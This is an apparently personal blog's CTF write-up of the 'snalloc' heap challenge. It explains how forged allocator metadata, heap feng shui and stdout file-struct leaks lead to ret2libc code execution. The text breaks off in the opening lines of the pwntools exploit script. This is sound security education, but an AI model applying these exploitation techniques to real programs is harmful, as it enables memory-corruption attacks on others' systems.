@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  snalloc - Lake CTF 2025 · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="Exploiting a custom allocator with massive feng shui leaklessly">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="snalloc - Lake CTF 2025">
+	<meta name="twitter:description" content="Exploiting a custom allocator with massive feng shui leaklessly">
+
+<meta property="og:url" content="http://localhost:1313/posts/lake_snalloc/lake_snalloc/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="snalloc - Lake CTF 2025">
+	<meta property="og:description" content="Exploiting a custom allocator with massive feng shui leaklessly">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-03-01T23:49:32+07:00">
+		<meta property="article:modified_time" content="2026-03-01T23:49:32+07:00">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Allocator">
+		<meta property="article:tag" content="Feng-Shui">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/lake_snalloc/lake_snalloc/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/lake_snalloc/lake_snalloc/">
+              snalloc - Lake CTF 2025
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-03-01T23:49:32&#43;07:00">
+                March 1, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              13-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a>
+      <span class="separator">•</span>
+    <a href="/authors/leo_something/">Leo_something</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/allocator/">Allocator</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/feng-shui/">Feng-Shui</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <h2 id="overview">
+  Overview
+  <a class="heading-link" href="#overview">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>This was an heap challenge with a custom allocator implementation.
+The main program basically let you allocate, edit and free chunks using either the custom allocator or the malloc allocator.</p>
+<hr>
+<h2 id="vulnerability">
+  Vulnerability
+  <a class="heading-link" href="#vulnerability">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="snalloc-internals">
+  Snalloc Internals
+  <a class="heading-link" href="#snalloc-internals">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>In the snallloc implementation, glibc malloc is still used as the &ldquo;buddy&rdquo; allocator. It is exclusively used to request blocks of memory that are multiple of <code>PAGESIZE</code> in size.</p>
+<p>These blocks of memory are called &ldquo;snabs&rdquo; in snalloc lingo.
+Snabs provide space for allocations of the same size, and are preceded by a whole page reserved for metadata. There are four possible &ldquo;orders&rdquo; of snabs, which determine how big they are internally. The following orders are available for use:</p>
+<table>
+	<thead>
+			<tr>
+					<th>order</th>
+					<th>metadata size</th>
+					<th>user-data size</th>
+					<th>snab size</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>0</td>
+					<td>1 page</td>
+					<td>1 page</td>
+					<td>2 pages</td>
+			</tr>
+			<tr>
+					<td>1</td>
+					<td>1 page</td>
+					<td>2 pages</td>
+					<td>3 pages</td>
+			</tr>
+			<tr>
+					<td>2</td>
+					<td>1 page</td>
+					<td>3 pages</td>
+					<td>4 pages</td>
+			</tr>
+			<tr>
+					<td>3</td>
+					<td>1 page</td>
+					<td>4 pages</td>
+					<td>5 pages</td>
+			</tr>
+	</tbody>
+</table>
+<p>The metadata consists of following properties:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">struct</span> <span style="color:#ff7b72">snab_t</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">magic_t</span> magic;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">uint64_t</span> flags;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">order_t</span> order;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">bitmap_t</span> bitmap;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">struct</span> <span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>prev;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">struct</span> <span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>next;
+</span></span><span style="display:flex;"><span>} <span style="color:#ff7b72">snab_t</span>;
+</span></span></code></pre></div><p><code>magic</code> is used, to identify metadata pages that contain <code>snab_t</code>.
+To extend snabs to hold more chunks, <code>flags</code> are used in combination with <code>prev</code>/<code>next</code>, serving as a double linked list.
+The order of a snab is obviously stored in <code>order</code>.
+Lastly, <code>bitmap</code> is used for signaling free and used chunks, by setting the respective bits to 0 or 1.</p>
+<h3 id="core-vulnerability">
+  Core Vulnerability
+  <a class="heading-link" href="#core-vulnerability">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Now let&rsquo;s get to the core vulnerability of this challenge: looking at the design of the allocator, one might ask how the metadata page is located when freeing single chunks.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">snfree</span>(<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>chunk) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>snab <span style="color:#ff7b72;font-weight:bold">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  snab <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">get_snab_from_chunk</span>(chunk);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">_snfree</span>(snab, chunk);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Well, <code>snfree</code> signals that this logic is defined in <code>get_snab_from_chunk</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#d2a8ff;font-weight:bold">get_snab_from_chunk</span>(<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>chunk) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>snab <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>)((<span style="color:#ff7b72">size_t</span>)chunk <span style="color:#ff7b72;font-weight:bold">&amp;</span> <span style="color:#ff7b72;font-weight:bold">~</span>(PAGE <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#a5d6ff">1</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>snab_min <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)snab <span style="color:#ff7b72;font-weight:bold">+</span> PAGE <span style="color:#ff7b72;font-weight:bold">-</span> <span style="color:#d2a8ff;font-weight:bold">ORDER_2_SNAB_SZ</span>(SNAB_MAX_ORDER);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">LOG_DEBUG</span>(<span style="color:#a5d6ff">&#34;chunk: %p, page: %p, min_snab: %p</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, chunk, snab, snab_min);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">LOG_DEBUG</span>(<span style="color:#a5d6ff">&#34;page: %p, magic: %#zx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, snab, <span style="color:#d2a8ff;font-weight:bold">SNAB_MAGIC</span>(snab));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">while</span> ((snab<span style="color:#ff7b72;font-weight:bold">-&gt;</span>magic <span style="color:#ff7b72;font-weight:bold">!=</span> <span style="color:#d2a8ff;font-weight:bold">SNAB_MAGIC</span>(snab)) <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> ((<span style="color:#ff7b72">void</span> <span style="color:#ff7b72;font-weight:bold">*</span>)snab <span style="color:#ff7b72;font-weight:bold">&gt;=</span> snab_min)) {
+</span></span><span style="display:flex;"><span>    snab <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">snab_t</span> <span style="color:#ff7b72;font-weight:bold">*</span>)((<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)snab <span style="color:#ff7b72;font-weight:bold">-</span> PAGE);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">LOG_DEBUG</span>(<span style="color:#a5d6ff">&#34;page: %p, proper magic: %#zx, actual magic: %#zx</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&#34;</span>, snab, <span style="color:#d2a8ff;font-weight:bold">SNAB_MAGIC</span>(snab), snab<span style="color:#ff7b72;font-weight:bold">-&gt;</span>magic);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#8b949e;font-style:italic">// ...
+</span></span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As you can see, the current chunks address is rounded down to a page aligned address, from there a loop checks if it can find the magic bytes at the start of the page; if not, check the previous page and so on.</p>
+<p>However this approach can be easily exploited: as there can be snabs with an <code>order</code> greater than 0. It is wrong to assume that this is a safe way to get the base snab address. This is because the user can just fake snab magic bytes in the first of <code>n</code> user pages, making the allocator believe a valid snab is there. As a result, the user can now free a chunk in the next user-data page and fake a snab.</p>
+<h2 id="exploitation">
+  Exploitation
+  <a class="heading-link" href="#exploitation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>We had a lot of fun while exploiting this challenge because it needed a lot of heap setup and premeditation, which usually makes people hate heap challenges, but in this case the heap feng shui was neat and straight forward (once we had it all planned out).</p>
+<h3 id="setup-a-fake-snab_t-magic">
+  Setup a fake snab_t-&gt;magic
+  <a class="heading-link" href="#setup-a-fake-snab_t-magic">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>The first thing we needed to figure out in order to exploit this vulnerability was how to fake a metadata chunk. This is not straight forward due to the presence of the <code>magic</code> field in <code>snab_t</code>.
+Recall that <code>SNAB_MAGIC(snab) = ((uint64_t)(snab)) &gt;&gt; 12</code>, so as we don&rsquo;t know where &ldquo;snab&rdquo; is in memory we can&rsquo;t directly forge it&rsquo;s <code>magic</code>.</p>
+<p>This is where <a href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation"  class="external-link" target="_blank" rel="noopener">safe linking</a> comes to the rescue.
+This mitigation was added in libc 2.32 to make heap corruptions harder to exploit, it basically implements a <a href="https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/malloc/malloc.c#L331"  class="external-link" target="_blank" rel="noopener">mangling algorithm</a> to protect forward pointers in tcache and fastbin chunks:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define PROTECT_PTR(pos, ptr) \
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">	(__typeof (ptr)) (((size_t) pos &gt;&gt; 12) ^ (size_t(ptr)))
+</span></span></span></code></pre></div><p>Where <code>pos</code> is the address of the chunk containing the forward pointer, and <code>ptr</code> is the forward pointer to mangle.
+This means that the last chunk in a bin will have as next pointer <code>(pos&gt;&gt;12) ^ 0 = pos &gt;&gt; 12</code>, which is exactly the same operation <code>SNAB_MAGIC</code> uses to compute the magic for a snab!</p>
+<p>Our goal is to place a valid magic value at a page aligned offset so as to forge a fake metadata chunk inside of a data chunk. To achieve this we need to put a mangled forward pointer in a place where snalloc will allocate from.
+As snabs are big chunks, with size multiple of 0x1000, they can only be allocated from either an unsortedbin or the top chunk. Unsortedbins don&rsquo;t use the PROTECT_PTR macro and are linked in doubly-linked lists and the top chunks is not in a bin of course.
+What we did was the following:</p>
+<ol>
+<li>Allocate a lot of chunks of the same size using the regular malloc</li>
+<li>Free 7 of these to fill the tcache</li>
+<li>Free another chunk, this will be the last one in the fastbins and it&rsquo;s manlged forward pointer will be the <code>magic</code>, this will need to be page-aligned to create a fake metadata chunk later.</li>
+<li>Trigger <a href="https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/malloc/malloc.c#L4913"  class="external-link" target="_blank" rel="noopener">malloc_consolidate</a> to consolidate all the fastbins with the top chunk. To avoid messing too much with snalloc we used the <code>scanf</code> trick (by providing an input of 0x800 bytes or more scanf allocates a buffer on the heap and frees it before returning,  this free triggers the consolidation).</li>
+<li>Allocate an order 1 (or more) snab from the top chunk to get that <code>magic</code> in the first user-data page, then freeing a chunk in the second user-data page will use the first one as it&rsquo;s metadata (which is now valid).</li>
+</ol>
+<h3 id="snabs-on-the-heap">
+  Snabs on the heap
+  <a class="heading-link" href="#snabs-on-the-heap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Knowing how to forge a metadata chunk we need to find a way of bypassing ASLR.
+Achieving this required some premeditation, you can&rsquo;t just try stuff out, otherwise you&rsquo;ll end up rewriting your exploit from scratch several times.
+The first step is to understand how snalloc allocations look like in memory. Also note that snabs of the same order are linked in a doubly-linked list.
+<!-- raw HTML omitted -->
+Padding chunks are there because <code>posix_memalign</code> page-aligns the chunk data (the actual data of the chunk, don&rsquo;t mistake it with user-data page), leaving the metadata of the chunk (<code>prev-size</code> and <code>size</code>) in the page before, this implies that the page before has only 0xff0 bytes available, which is not enough for a <code>posix_memalign</code> allocation.
+<!-- raw HTML omitted -->
+Here you can see <code>prev-size</code> and <code>size</code> highlighted in red.</p>
+<h3 id="heap-shaping">
+  Heap shaping
+  <a class="heading-link" href="#heap-shaping">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>With all of this knowledge we can finally design the heap feng shui.
+Our first goal was to get ASLR leaks and to do that we decided to target the doubly-linked list pointers.
+The layout we came up with was the following.
+<!-- raw HTML omitted -->
+The basic idea here is to create an order 3 snab that overlaps with an order 1 snab, then we can use the first one to partial override a next pointer in the second one (with 4 bits of bruteforce).
+We also carefully placed a free smallbin chunk and forged a snab metadata struct around it, using it&rsquo;s fd as a valid next pointer inside libc <code>main_arena</code>.
+<!-- raw HTML omitted -->
+We then partially overrode that pointer to link the stdout file (Note that <code>main_arena</code> is usually near <code>_IO_2_1_stdout_</code>, the latter can be reached with a 4 bit bruteforce).</p>
+<p>At this point it&rsquo;s enough to fill the <code>snab-&gt;bitmap</code> of both the overlapped snab and the fake snab on the smallbin, to place the next order 1 allocation over the stdout file struct.</p>
+<p>With an allocation over stdout we simply used <a href="https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive"  class="external-link" target="_blank" rel="noopener">this technique</a> to get libc and stack leaks by partially overriding the file struct.
+Finally we changed the smallbin pointer (<code>snab-&gt;next</code>) to allocate a chunk on the stack frame of <code>do_cmd()</code> and write a ret2libc payload to gain RCE.</p>
+<h3 id="some-notes">
+  Some notes
+  <a class="heading-link" href="#some-notes">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ol>
+<li>Before performing the heap feng shui we had to allocate three order 0 snabs to increase <code>snab_count</code> (which keeps track of the total number of allocated snabs), we had to do this step to avoid an integer underflow that would have set <code>snab_count</code> to a huge number, preventing us from allocating more snabs.</li>
+<li>The &ldquo;size chunk&rdquo; is simply a chunk used to change the ptmalloc size metadata of the fake snab.</li>
+<li>To pass all the checks performed by the snab allocator we set <code>snab-&gt;magic =  SNAB_AUTO | SNAB_EXTEND</code></li>
+<li>This whole heap setup works because there are no stringent checks on the integrity of the doubly-linked list and the <code>snab-&gt;magic</code> for &ldquo;next&rdquo; snabs.</li>
+<li>The whole exploit requires 8 bits of bruteforce (4 for each partial override)</li>
+</ol>
+<h3 id="final-exploit">
+  Final Exploit
+  <a class="heading-link" href="#final-exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#ff7b72;font-weight:bold">=</span> ELF(<span style="color:#a5d6ff">&#34;chal_patched&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff7b72;font-weight:bold">=</span> ELF(<span style="color:#a5d6ff">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff7b72;font-weight:bold">.</span>binary <span style="color:#ff7b72;font-weight:bold">=</span> exe
+</span></span><span style="display:flex;"><span>context<span style="color:#ff7b72;font-weight:bold">.</span>terminal <span style="color:#ff7b72;font-weight:bold">=</span> [<span style="color:#a5d6ff">&#34;alacritty&#34;</span>, <span style="color:#a5d6ff">&#34;-e&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NC_CMD <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;nc chall.polygl0ts.ch 6019&#34;</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#ff7b72;font-weight:bold">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">set resolve-heap-via-heuristic force
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">b *snab_free_chunk_get+285
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> args<span style="color:#ff7b72;font-weight:bold">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff7b72;font-weight:bold">=</span> process([exe<span style="color:#ff7b72;font-weight:bold">.</span>path])
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">elif</span> args<span style="color:#ff7b72;font-weight:bold">.</span>GDB:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff7b72;font-weight:bold">=</span> process([exe<span style="color:#ff7b72;font-weight:bold">.</span>path])
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#ff7b72;font-weight:bold">.</span>attach(r, gdbscript<span style="color:#ff7b72;font-weight:bold">=</span>gdbscript)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#ff7b72;font-weight:bold">=</span> remote(NC_CMD<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34; &#34;</span>)[<span style="color:#a5d6ff">1</span>], int(NC_CMD<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34; &#34;</span>)[<span style="color:#a5d6ff">2</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">alloc</span>(r, idx, sz, alloc):
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(alloc)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(idx)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(sz)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">edit</span>(r, idx, data, alloc):
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(alloc)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(idx)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">delete</span>(r, idx, alloc):
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, <span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(alloc)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>    r<span style="color:#ff7b72;font-weight:bold">.</span>sendlineafter(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;&gt;&#34;</span>, str(idx)<span style="color:#ff7b72;font-weight:bold">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">debug</span>(r):
+</span></span><span style="display:flex;"><span>    script <span style="color:#ff7b72;font-weight:bold">=</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    set resolve-heap-via-heuristic force
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    b readline
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">    &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#ff7b72;font-weight:bold">.</span>attach(r, script)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MALLOC <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">1</span>
+</span></span><span style="display:flex;"><span>SNALLOC <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">while</span> <span style="color:#79c0ff">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">try</span>:
+</span></span><span style="display:flex;"><span>            r <span style="color:#ff7b72;font-weight:bold">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># fill two order 0 snab and allocate another one</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#8b949e;font-style:italic"># this increases snab_count (this is essential for later)</span>
